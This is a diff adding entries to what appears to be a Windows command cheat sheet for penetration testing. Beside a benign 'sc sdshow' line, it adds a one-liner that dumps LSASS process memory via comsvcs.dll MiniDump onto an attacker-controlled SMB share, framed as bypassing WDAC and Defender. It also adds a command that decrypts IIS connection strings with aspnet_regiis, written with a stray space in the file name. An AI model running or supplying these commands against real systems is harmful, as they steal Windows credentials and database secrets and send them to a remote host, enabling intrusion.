@@ -91,6 +91,9 @@ sc query state= all
 # Details for a service
 sc query <name>
 
+# show service permission (Security Descriptors show)
+sc sdshow <service>
+
 # start a service
 sc start <name>
 
@@ -129,3 +132,10 @@ dir /b /s <dir>\<file>
 
 # Find file from systemroot
 dir /b /s %systemroot%\<file>
+
+# Bypass WDAC Defender to execute lsass dump without touching disk
+New-PSDrive -Name "X" -PSProvider "FileSystem" -Root "\\smbserver_under_your_control\c$"
+powershell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id x:\lassdump.bin full
+
+# IIS decrypt connection strings inside files of IIS Web directory
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.ex e -pdf connectionStrings C:\Inetpub\www\<dir>
